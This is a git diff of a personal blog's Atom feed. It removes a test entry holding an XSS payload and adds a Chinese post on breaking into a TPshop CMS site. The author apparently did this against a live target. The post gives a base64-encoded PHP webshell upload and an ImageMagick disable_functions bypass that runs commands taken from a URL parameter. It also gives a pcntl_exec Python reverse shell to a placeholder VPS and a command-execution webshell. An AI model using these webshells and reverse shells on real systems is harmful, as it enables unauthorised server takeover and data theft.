@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://ja9er.github.io</id>
     <title>Ja9er&apos;s Studio</title>
-    <updated>2022-01-17T03:44:40.496Z</updated>
+    <updated>2022-01-17T03:45:59.942Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://ja9er.github.io"/>
     <link rel="self" href="https://ja9er.github.io/atom.xml"/>
@@ -10,15 +10,6 @@
     <logo>https://ja9er.github.io/images/avatar.png</logo>
     <icon>https://ja9er.github.io/favicon.ico</icon>
     <rights>All rights reserved 2022, Ja9er&apos;s Studio</rights>
-    <entry>
-        <title type="html"><![CDATA[test]]></title>
-        <id>https://ja9er.github.io/post/uA8jz16xz/</id>
-        <link href="https://ja9er.github.io/post/uA8jz16xz/">
-        </link>
-        <updated>2022-01-17T03:40:21.000Z</updated>
-        <content type="html"><![CDATA[<p><img src=x onerror=alert(1) >test</a></p>
-]]></content>
-    </entry>
     <entry>
         <title type="html"><![CDATA[从验证码爆破开始的burp插件学习]]></title>
         <id>https://ja9er.github.io/post/IX1z9lGDP/</id>
@@ -1795,6 +1786,74 @@ if __name__ == &quot;__main__&quot;:
 <p>验证截图<br>
 <a href="https://imgtu.com/i/R5LQKg"><img src="https://z3.ax1x.com/2021/07/05/R5LQKg.md.png" alt="R5LQKg.md.png" loading="lazy"></a><br>
 <a href="https://imgtu.com/i/R5LlrQ"><img src="https://z3.ax1x.com/2021/07/05/R5LlrQ.md.png" alt="R5LlrQ.md.png" loading="lazy"></a></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[从TPshopcms到GetShell]]></title>
+        <id>https://ja9er.github.io/post/cong-tpshopcms-dao-getshell1/</id>
+        <link href="https://ja9er.github.io/post/cong-tpshopcms-dao-getshell1/">
+        </link>
+        <updated>2021-07-05T10:00:27.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="0x01-开始">0X01 开始</h1>
+<p>日常工作中日站，找到一个冷门cms-tpshop。<br>
+祭出万能的百度大法，有洞，还是前台！！！ 可以搞<br>
+给一个参考链接:<br>
+https://www.seebug.org/vuldb/ssvid-96925</p>
+<h1 id="0x02过程">0x02过程</h1>
+<p><a href="https://imgtu.com/i/RWwgNF"><img src="https://z3.ax1x.com/2021/07/04/RWwgNF.md.png" alt="RWwgNF.md.png" loading="lazy"></a><br>
+PD9waHAgcGhwaW5mbygpO3VubGluayhfX0ZJTEVfXyk7Pz4=</p>
+<p>base64解码为，</p>
+<pre><code class="language-php">&lt;?php phpinfo();unlink(__FILE__);?&gt;
+</code></pre>
+<p>传了个phpinfo()上去,观察一下<br>
+<a href="https://imgtu.com/i/RWwy7T"><img src="https://z3.ax1x.com/2021/07/04/RWwy7T.md.png" alt="RWwy7T.md.png" loading="lazy"></a><br>
+发现直接ban掉所有可执行命令的函数。</p>
+<h1 id="0x03绕过disable_function">0x03绕过disable_function</h1>
+<h2 id="imagemagick绕过">ImageMagick绕过</h2>
+<pre><code class="language-php">&lt;?php
+echo &quot;Disable Functions: &quot; . ini_get('disable_functions') . &quot;\n&quot;;
+$command = PHP_SAPI == 'cli' ? $argv[1] : $_GET['cmd'];
+if ($command == '') {
+    $command = 'id';
+}
+$command = $command . &quot;&gt;&quot; . SAE_TMP_PATH . &quot;/data&quot;;
+$exploit = &lt;&lt;&lt;EOF
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://example.com/image.jpg&quot;|$command&quot;)'
+pop graphic-context
+EOF;
+
+$path1 = SAE_TMP_PATH . &quot;KKKK.mvg&quot;;
+$path2 = SAE_TMP_PATH . &quot;KKKK.png&quot;;
+file_put_contents($path1, $exploit);
+$thumb = new Imagick();
+$thumb-&gt;readImage($path1);
+$thumb-&gt;writeImage($path2);
+$thumb-&gt;clear();
+$thumb-&gt;destroy();
+unlink(&quot;$path1&quot;);
+unlink(&quot;$path2&quot;);
+echo file_get_contents(SAE_TMP_PATH . &quot;/data&quot;);
+?&gt;
+</code></pre>
+<p>base64以后传上去，可惜不行<br>
+<a href="https://imgtu.com/i/RWwcAU"><img src="https://z3.ax1x.com/2021/07/04/RWwcAU.md.png" alt="RWwcAU.md.png" loading="lazy"></a></p>
+<h2 id="利用pcntl_exec突破disable_functions">利用pcntl_exec突破disable_functions</h2>
+<p>pcntl是linux下的一个扩展，可以支持php的多线程操作。(与python结合反弹shell) pcntl_exec函数的作用是在当前进程空间执行指定程序，版本要求：PHP 4 &gt;= 4.2.0, PHP 5</p>
+<pre><code class="language-php">&lt;?php  pcntl_exec(&quot;/usr/bin/python&quot;,array('-c', 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect((&quot;vpsIP&quot;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);'));?&gt;
+</code></pre>
+<p>实质就是利用php弹出Python的shell，由于靶机是linux的，python自带。<br>
+<strong>so</strong><br>
+base64后，上传后顺利获取shell<br>
+<a href="https://imgtu.com/i/RWwsBV"><img src="https://z3.ax1x.com/2021/07/04/RWwsBV.md.png" alt="RWwsBV.md.png" loading="lazy"></a></p>
+<h1 id="0x04-命令执行">0x04 命令执行</h1>
+<p>如果只想传一个命令执行的马上去的话<br>
+能用python就用python,命令结果写入文件即可，注意双引号(踩坑记录)</p>
+<pre><code class="language-php">&lt;?php pcntl_exec( &quot;/usr/bin/python&quot;, array( '-c',
+'import os;
+os.system(&quot;pwd &gt;1.txt&quot; );')); ?&gt;
+</code></pre>
 ]]></content>
     </entry>
 </feed>
